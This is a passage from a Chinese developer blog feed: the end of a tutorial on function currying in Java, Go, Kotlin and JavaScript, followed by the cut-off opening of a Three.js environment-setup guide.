    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 定义一个柯里化的日志函数</span>
        <span class="hljs-comment">// 第一层：接收日志级别 (level)</span>
        <span class="hljs-comment">// 第二层：接收具体消息 (message)</span>
        Function&lt;String, Function&lt;String, String&gt;&gt; logFormatter = 
            level -&gt; message -&gt; <span class="hljs-string">"["</span> + level + <span class="hljs-string">"] "</span> + message;

        <span class="hljs-comment">// 场景：我们需要频繁打印 ERROR 级别的日志</span>
        <span class="hljs-comment">// 我们可以“固定”第一个参数，生成一个专门打印 Error 的函数</span>
        Function&lt;String, String&gt; errorLogger = logFormatter.apply(<span class="hljs-string">"ERROR"</span>);
        Function&lt;String, String&gt; infoLogger = logFormatter.apply(<span class="hljs-string">"INFO"</span>);

        <span class="hljs-comment">// 以后使用时，只需要传消息内容</span>
        System.out.println(errorLogger.apply(<span class="hljs-string">"数据库连接失败"</span>));
        System.out.println(errorLogger.apply(<span class="hljs-string">"空指针异常"</span>));
        System.out.println(infoLogger.apply(<span class="hljs-string">"系统启动成功"</span>));
    }
}
</code></pre>
<p>如果参数多，类型定义会变得非常长且难看：</p>
<pre><code class="hljs language-java" lang="java">Function&lt;Integer,
    Function&lt;Integer,
        Function&lt;Integer, Integer&gt;&gt;&gt; sum3 =
            a -&gt; b -&gt; c -&gt; a + b + c;

<span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> sum3.apply(<span class="hljs-number">1</span>).apply(<span class="hljs-number">2</span>).apply(<span class="hljs-number">3</span>);
</code></pre>
<p>缺点（相比 JS 或 Haskell）：</p>
<ul>
<li>啰嗦：类型签名非常长（<code>Function&lt;T, Function&lt;...&gt;&gt;</code>），可读性差。</li>
<li>调用繁琐：必须显式调用 <code>.apply()</code>，不能像 JS 那样直接括号 <code>func(a)(b)</code>，而是 <code>func.apply(a).apply(b)</code>。</li>
<li>性能：每次调用都会创建新的 Function 对象，在极端高性能敏感的场景下可能有微小的开销（通常可忽略）。</li>
</ul>
<p>接下来看看我最喜欢的两门语言 Go 和 Kotlin 的柯里化。</p>
<h2 data-id="heading-3">Go 函数的柯里化</h2>
<p>Go 语言没有原生的柯里化语法或机制，只能通过闭包和高阶函数来手动模拟。</p>
<p><strong>普通手写柯里化版本</strong>:</p>
<p>比如一个 logger：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Log</span><span class="hljs-params">(level, module, msg <span class="hljs-type">string</span>)</span></span> {
    fmt.Println(level, module, msg)
}
</code></pre>
<p>柯里化它：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CurryLog</span><span class="hljs-params">(level <span class="hljs-type">string</span>)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">string</span>)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">string</span>)</span></span> {
    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(module <span class="hljs-type">string</span>)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">string</span>)</span></span> {
        <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(msg <span class="hljs-type">string</span>)</span></span> {
            fmt.Println(level, module, msg)
        }
    }
}
</code></pre>
<p>使用：</p>
<pre><code class="hljs language-go" lang="go">info := CurryLog(<span class="hljs-string">"INFO"</span>)
err  := CurryLog(<span class="hljs-string">"ERROR"</span>)

dbInfo := info(<span class="hljs-string">"DB"</span>)
dbErr  := err(<span class="hljs-string">"DB"</span>)

dbInfo(<span class="hljs-string">"connected"</span>)
dbInfo(<span class="hljs-string">"query failed"</span>)
dbErr(<span class="hljs-string">"add failed"</span>)
dbErr(<span class="hljs-string">"update failed"</span>)
</code></pre>
<p><strong>半通用转换器版本</strong>：</p>
<p>写一个辅助函数，将任意符合特定签名的双参数函数转换为柯里化形式。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span>

<span class="hljs-comment">// Curry 是一个通用转换器</span>
<span class="hljs-comment">// 它接收一个形式为 func(A, B) C 的函数</span>
<span class="hljs-comment">// 返回 func(A) func(B) C</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Curry</span>[<span class="hljs-title">A</span>, <span class="hljs-title">B</span>, <span class="hljs-title">C</span> <span class="hljs-title">any</span>]<span class="hljs-params">(f <span class="hljs-keyword">func</span>(A, B)</span></span> C) <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(A)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(B)</span></span> C {
    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(a A)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(B)</span></span> C {
        <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(b B)</span></span> C {
            <span class="hljs-keyword">return</span> f(a, b)
        }
    }
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Multiply</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> {
    <span class="hljs-keyword">return</span> a * b
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 将普通函数转换为柯里化函数</span>
    curriedMult := Curry(Multiply)

    <span class="hljs-comment">// 创建一个“双倍器”</span>
    doubler := curriedMult(<span class="hljs-number">2</span>)

    fmt.Println(doubler(<span class="hljs-number">5</span>))
    fmt.Println(doubler(<span class="hljs-number">10</span>))
}
</code></pre>
<p>遗憾的是，Go 没有像 JS 那样的可变参数，不能柯里化任意长度参数列表的函数。</p>
<p><strong>还有一个用泛型加反射实现的通用版本（不推荐）</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> curry

<span class="hljs-keyword">import</span> <span class="hljs-string">"reflect"</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Curry</span><span class="hljs-params">(fn any)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(any)</span></span> any {
    fnVal := reflect.ValueOf(fn)
    fnType := fnVal.Type()

    <span class="hljs-keyword">if</span> fnType.Kind() != reflect.Func {
        <span class="hljs-built_in">panic</span>(<span class="hljs-string">"Curry expects a function"</span>)
    }

    arity := fnType.NumIn()

    <span class="hljs-keyword">var</span> curry <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(args []reflect.Value)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(any)</span></span> any

    curry = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(args []reflect.Value)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(any)</span></span> any {
        <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg any)</span></span> any {
            newArgs := <span class="hljs-built_in">append</span>(args, reflect.ValueOf(arg))

            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(newArgs) &lt; arity {
                <span class="hljs-keyword">return</span> curry(newArgs)
            }

            <span class="hljs-comment">// 参数齐了，调用函数</span>
            results := fnVal.Call(newArgs)

            <span class="hljs-comment">// 只支持 0 或 1 返回值</span>
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(results) == <span class="hljs-number">0</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
            }
            <span class="hljs-keyword">return</span> results[<span class="hljs-number">0</span>].Interface()
        }
    }

    <span class="hljs-keyword">return</span> curry(<span class="hljs-literal">nil</span>)
}
</code></pre>
<p>使用示例：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Add</span><span class="hljs-params">(a, b, c <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> {
    <span class="hljs-keyword">return</span> a + b + c
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    c := Curry(Add)

    f1 := c(<span class="hljs-number">1</span>).(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(any)</span></span> any)
    f2 := f1(<span class="hljs-number">2</span>).(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(any)</span></span> any)
    result := f2(<span class="hljs-number">3</span>).(<span class="hljs-type">int</span>)

    fmt.Println(result)
}
</code></pre>
<p>支持不同类型参数：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Mix</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">string</span>, c <span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">string</span> {
	<span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">"%d-%s-%.2f"</span>, a, b, c)
}

c := Curry(Mix)
r := c(<span class="hljs-number">1</span>).(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(any)</span></span> any)(<span class="hljs-string">"go"</span>).(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(any)</span></span> any)(<span class="hljs-number">3.14</span>).(<span class="hljs-type">string</span>)
</code></pre>
<p>⚠️ 注意：这个版本不优雅、不安全、不惯用，只能算“技术演示级别”，不适合生产。技术上可实现（反射 + any），工程上不值得，Go 风格不推荐。</p>
<ol>
<li>
<p>它完全丢失静态类型</p>
<p>你看到的类型链是：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(any)</span></span> any
</code></pre>
<p>Go 编译器：</p>
<ul>
<li>无法检查参数类型</li>
<li>无法检查返回类型</li>
<li>IDE 无法补全</li>
</ul>
</li>
<li>
<p>性能很差</p>
<ul>
<li>reflect.ValueOf</li>
<li>reflect.Call</li>
<li>interface{} 装箱/拆箱</li>
</ul>
<p>在热点路径上是灾难级别。</p>
</li>
<li>
<p>错误全在运行时爆炸</p>
<pre><code class="hljs language-go" lang="go">c(<span class="hljs-string">"hello"</span>) <span class="hljs-comment">// panic</span>
</code></pre>
<p>不是编译期错误，而是 runtime panic。</p>
</li>
</ol>
<p><strong>柯里化在 Go 中的缺点</strong>：</p>
<p>虽然能做，但在 Go 中滥用柯里化会被视为 非惯用做法，原因如下：</p>
<ol>
<li>
<p><strong>类型签名复杂</strong>：</p>
<ul>
<li>普通：func(int, int, int) int</li>
<li>柯里化：func(int) func(int) func(int) int</li>
<li>这对阅读代码的人来说是折磨，而且 Go 不支持类型推导省略函数签名。</li>
</ul>
</li>
<li>
<p><strong>性能损耗</strong>：</p>
<p>每次调用柯里化函数都会涉及到内存分配（闭包对象）和函数调用开销。在高性能要求的场景（如紧密循环）中，这比直接传参要慢。</p>
</li>
<li>
<p><strong>调试困难</strong>：</p>
<p>堆栈跟踪会因为层层嵌套的匿名函数变得很深且难以阅读。</p>
</li>
</ol>
<p><strong>为什么 Go 不原生支持柯里化？</strong></p>
<p>这是 Go 的设计取向决定的：</p>
<p>Go 追求的是：</p>
<ul>
<li>显式</li>
<li>简单</li>
<li>可读</li>
<li>易于静态分析和优化</li>
</ul>
<p>而柯里化依赖：</p>
<ul>
<li>隐式闭包</li>
<li>层层返回函数</li>
<li>动态函数组合</li>
</ul>
<p>这些在 Go 的设计哲学里被认为是<strong>可读性和可维护性成本过高</strong>。</p>
<p><strong>为什么泛型救不了 curry ？</strong></p>
<p>Go 泛型不能：</p>
<ul>
<li>解构函数参数列表</li>
<li>操作 variadic type list</li>
<li>根据函数签名生成新函数类型</li>
</ul>
<p>Go 没有 Type-Level Programming。</p>
<p><strong>Go 里真正“惯用”的写法</strong></p>
<p>Go 程序员更倾向写：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithDB</span><span class="hljs-params">(db *DB)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(Request)</span></span> Response {
    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req Request)</span></span> Response {
        ...
    }
}
</code></pre>
<p>这是 Go 风格的依赖注入。</p>
<p>这本质就是：</p>
<blockquote>
<p>柯里化 + 偏应用</p>
</blockquote>
<p>只是 Go 不用这个词。</p>
<p><strong>什么时候用？</strong></p>
<ul>
<li>不要在简单的逻辑计算中使用（不要为了炫技而柯里化）。</li>
<li>推荐使用场景：中间件设计、依赖注入、参数预设（偏函数应用）、接口适配器。</li>
</ul>
<h2 data-id="heading-4">Kotlin 函数的柯里化</h2>
<p>Kotlin 不原生支持自动柯里化（不像 Haskell），但语言特性非常适合手动柯里化，而且写法相当自然。</p>
<h3 data-id="heading-5">手动柯里化</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 普通多参数函数</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sum</span><span class="hljs-params">(x: <span class="hljs-type">Int</span>, y: <span class="hljs-type">Int</span>, z: <span class="hljs-type">Int</span>)</span></span> = x + y + z

<span class="hljs-comment">// 柯里化</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sumCurried</span><span class="hljs-params">(x: <span class="hljs-type">Int</span>)</span></span> = { y: <span class="hljs-built_in">Int</span> -&gt; { z: <span class="hljs-built_in">Int</span> -&gt; x + y + z } }
<span class="hljs-comment">// 带返回值写法</span>
<span class="hljs-comment">// fun sumCurried(x: Int): (Int) -&gt; (Int) -&gt; Int = { y -&gt; { z -&gt; x + y + z } }</span>
<span class="hljs-comment">// 或者函数表达式写法</span>
<span class="hljs-comment">// val sumCurried: (Int) -&gt; (Int) -&gt; Int = { x -&gt; { y -&gt; { z -&gt; x + y + z } } }</span>
<span class="hljs-comment">// val sumCurried = { x: Int -&gt; { y: Int -&gt; { z: Int -&gt; x + y + z } } }</span>

<span class="hljs-comment">// 调用</span>
<span class="hljs-keyword">val</span> sum1And = sumCurried(<span class="hljs-number">1</span>)
<span class="hljs-keyword">val</span> sum1And2And = sum1And(<span class="hljs-number">2</span>)
<span class="hljs-keyword">var</span> res = sum1And2And(<span class="hljs-number">3</span>)

<span class="hljs-comment">// 或者链式调用</span>
res = sumCurried(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>)(<span class="hljs-number">3</span>)
println(res)
</code></pre>
<h3 data-id="heading-6">通用柯里化扩展函数</h3>
<p>泛型柯里化工具函数（非常实用）</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;X, Y, Z, R&gt;</span> <span class="hljs-params">((X, Y, Z)</span></span> -&gt; R).curry() = { x: X -&gt; { y: Y -&gt; { z: Z -&gt; <span class="hljs-keyword">this</span>(x, y, z) } } }

<span class="hljs-comment">// 使用</span>
<span class="hljs-keyword">val</span> sum = { x: <span class="hljs-built_in">Int</span>, y: <span class="hljs-built_in">Int</span>, z: <span class="hljs-built_in">Int</span> -&gt; x + y + z }
<span class="hljs-keyword">val</span> curriedSum = sum.curry()

<span class="hljs-keyword">val</span> res = curriedSum(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>)(<span class="hljs-number">3</span>)
println(res)
</code></pre>
<p>扩展：还有反柯里化函数：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;X, Y, Z, R&gt;</span> <span class="hljs-params">((X)</span></span> -&gt; (Y) -&gt; (Z) -&gt; R).uncurry() = { x: X, y: Y, z: Z -&gt; <span class="hljs-keyword">this</span>(x)(y)(z) }
</code></pre>
<h3 data-id="heading-7">使用 Arrow 库柯里化 (推荐)</h3>
<p>如果你在 Kotlin 中大量使用函数式编程，建议使用 Arrow 库（Kotlin 事实上的标准 FP 库）。它内置了强大的柯里化支持。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> arrow.core.curried

<span class="hljs-keyword">val</span> add = { a: <span class="hljs-built_in">Int</span>, b: <span class="hljs-built_in">Int</span> -&gt; a + b }
<span class="hljs-keyword">val</span> curriedAdd = add.curried()
</code></pre>
<p><strong>总结</strong></p>
<ol>
<li>柯里化将 (A, B) -&gt; C 转化为 (A) -&gt; (B) -&gt; C。</li>
<li>实现方式：利用 Kotlin 的高阶函数，返回 Lambda 嵌套。</li>
<li>核心价值：实现参数复用和延迟执行，通过固定部分参数来创建更具体的函数（偏函数）。</li>
</ol>
<h2 data-id="heading-8">JS 函数的柯里化</h2>
<blockquote>
<p>JavaScript 不是原生柯里化（Auto-curried）语言，在语言层面也没有像 Haskell 或 ML 那样“默认自动柯里化”的机制。
在 JavaScript 中，柯里化只是一种设计模式或编程技巧，而不是语言的默认行为。</p>
<p>虽然 JS 不是默认柯里化的，但现代 JavaScript (ES6+) 提供了很多语法糖，使得手动实现柯里化变得非常简便和优雅。只能说 JS 的动态类型和现代的简洁优雅的语法特性，使其特别容易实现柯里化。</p>
</blockquote>
<h3 data-id="heading-9">A. 箭头函数</h3>
<p>这是 JS 对柯里化最友好的语法支持。通过嵌套箭头函数，可以极其简洁地定义柯里化函数。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 现在的写法（极其接近数学定义）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = x =&gt; <span class="hljs-function"><span class="hljs-params">y</span> =&gt;</span> <span class="hljs-function"><span class="hljs-params">z</span> =&gt;</span> x + y + z;

<span class="hljs-comment">// 使用</span>
<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>)(<span class="hljs-number">3</span>);
</code></pre>
<h3 data-id="heading-10">B. Function.prototype.bind (偏函数应用)</h3>
<p>虽然 bind 严格来说实现的是偏函数应用 (Partial Application)，但它常被用来达到类似柯里化的效果（固定部分参数）。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>) {
    <span class="hljs-keyword">return</span> x + y;
}

<span class="hljs-comment">// 锁死第一个参数 x 为 10</span>
<span class="hljs-keyword">const</span> addTen = add.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">10</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">addTen</span>(<span class="hljs-number">5</span>));
</code></pre>
<h3 data-id="heading-11">C. 通用柯里化转换函数实现自动柯里化</h3>
<p>如果你想让普通的 JS 函数变成“不够参数就返回函数，够了就执行”的状态，需要写一个包装器：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">curry</span> = (<span class="hljs-params">fn</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">curried</span>(<span class="hljs-params">...args</span>) {
    <span class="hljs-keyword">if</span> (args.<span class="hljs-property">length</span> &gt;= fn.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">fn</span>(...args);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">...more</span>) =&gt;</span> <span class="hljs-title function_">curried</span>(...args, ...more);
  };
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">a, b, c</span>) =&gt; a + b + c;
<span class="hljs-keyword">const</span> curriedAdd = <span class="hljs-title function_">curry</span>(add);

<span class="hljs-title function_">curriedAdd</span>(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>)(<span class="hljs-number">3</span>);
<span class="hljs-title function_">curriedAdd</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)(<span class="hljs-number">3</span>);
<span class="hljs-title function_">curriedAdd</span>(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);
</code></pre>
<p><strong>总结</strong>：</p>
<ol>
<li>JS 不是原生柯里化语言：默认调用 f(a) 时，如果 f 需要两个参数，JS 不会返回函数，而是报错或计算出错误结果（NaN）。</li>
<li>没有专门的关键字：没有类似 curry function 这样的关键字。</li>
<li>语法支持不错：箭头函数 (a =&gt; b =&gt; c) 让手动写柯里化函数变得很轻松，这是目前 JS 中柯里化的主流实现方式。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Three.js 环境搭建与开发初识]]></title>    <link>https://juejin.cn/post/7595021656427970587</link>    <guid>https://juejin.cn/post/7595021656427970587</guid>    <pubDate>2026-01-14T09:58:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021656427970587" data-draft-id="7595030559564234803" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Three.js 环境搭建与开发初识"/> <meta itemprop="keywords" content="three.js"/> <meta itemprop="datePublished" content="2026-01-14T09:58:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端王校长"/> <meta itemprop="url" content="https://juejin.cn/user/2295436010076631"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Three.js 环境搭建与开发初识
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2295436010076631/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端王校长
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:58:11.000Z" title="Wed Jan 14 2026 09:58:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>本文档将详细介绍如何搭建ThreeJS开发环境以及创建您的第一个ThreeJS应用程序。通过本文档，您将学会：</p>
<ul>
<li>如何安装和配置ThreeJS开发环境</li>
<li>如何创建一个简单的3D立方体并让它旋转</li>
<li>如何将ThreeJS与Vue和React框架集成</li>
</ul>
<h2 data-id="heading-1">第一部分：环境搭建与第一个应用</h2>
<h3 data-id="heading-2">1. 初始化项目</h3>
<p>要创建一个ThreeJS项目，首先需要初始化一个新的npm项目并安装必要的依赖：</p>
<pre><code class="hljs language-bash" lang="bash">npm create vite@latest my-threejs-app
<span class="hljs-built_in">cd</span> my-threejs-app
npm install
npm install three
</code></pre>
<p>这将创建一个基于Vite的新项目，并安装ThreeJS作为依赖项。</p>
<h3 data-id="heading-3">2. 项目结构</h3>
<p>典型的ThreeJS项目结构如下：</p>
<pre><code class="hljs language-arduino" lang="arduino">my-threejs-app/
├── <span class="hljs-keyword">public</span>/
│   └── css/
│       └── style.css
├── src/
│   └── main.js
├── index.html
├── package.json
└── vite.config.js
</code></pre>
<h3 data-id="heading-4">3. HTML文件配置</h3>
<p>在<code>index.html</code>中，我们需要设置基本的HTML结构：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
